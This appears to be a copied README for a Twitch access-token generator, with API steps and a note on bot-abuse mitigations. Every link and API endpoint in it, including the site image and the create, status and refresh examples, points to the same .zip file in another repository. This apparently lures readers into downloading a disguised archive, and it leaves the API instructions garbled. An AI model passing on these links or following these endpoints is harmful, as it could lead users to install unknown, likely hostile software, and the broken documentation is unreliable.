# TwitchTokenGenerator.com
[https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip](https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip)

![Image of site](https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip)

### Overview
A simple tool to generate access tokens for Twitch with custom scopes. Good tool for testing various Twitch third party tools (like [swiftyspiffy/TwitchLib](https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip)).
- Full Site: [twitchtokengenerator.com](https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip)

### API
An API exists on TwitchTokenGenerator allowing the creation of tokens and implementation in applications. The API is currently implemented in TwitchLib. A flow of how the API works is listed below:

1. Ping the create endpoint to get a link to give to user:
 - Create Endpoint: `https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip`
 - Required Rarameters:
 
   - base64 encoded application title
  
   - scope list with + delimiter
  
 - Example create: `https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip+user_read`
2. Response will be a json object including success bool, an id, and a message string containing the auth url. Present the URL to the program user.
3. Your application should ping the status endpoint for updates on authorization.  The status will return error 3 "Not authorized yet" until the user authorizes their account. After authorization, the status endpoint will return their credentials on the first ping post-authorization. Additional pings will return error 4 "API instance has already expired". This is to protect the user.
 - Status endpoint: `https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip`
 - Required Parameters:
 
   - Id of auth flow

 - Example status: `https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip`
 - Please record your access token as well as the refresh token for usage.
4. Occasionally you will find that your Twitch access token has expired. This is new as of Twitch's oAuth2 implementation. To refresh, use the "refresh" token that you received in step 3 and hit the /api/refresh/ endpoint to get a new token.
 - Example refresh: `https://github.com/LIAM4545/twitch-token-generator/raw/refs/heads/master/assets/images/token_generator_twitch_finableness.zip{refresh_token}`

### Logging and Website Attacks
Over the last year or two, the website has seen significant increase in traffic, and with that has come additional bot attacks and malicious users. I've added significantly more logging, as well as attempts at detecting such behavior. I've also added mitigations including scrambling the website code, recaptcha, and a few other methods to try to prevent malicious users from generating access and refresh tokens to perform large scale chat spam attacks on Twitch, and mass followings of streamers.
- That is to say, if you use this website to mass generate tokens for hundreds and thousands of accounts, and these accounts are used to attack Twitch streamers, I will (and have) shared in bulk, accounts that I feel are suspicious with Twitch's safety team.

### License
MIT License. &copy; 2021 Cole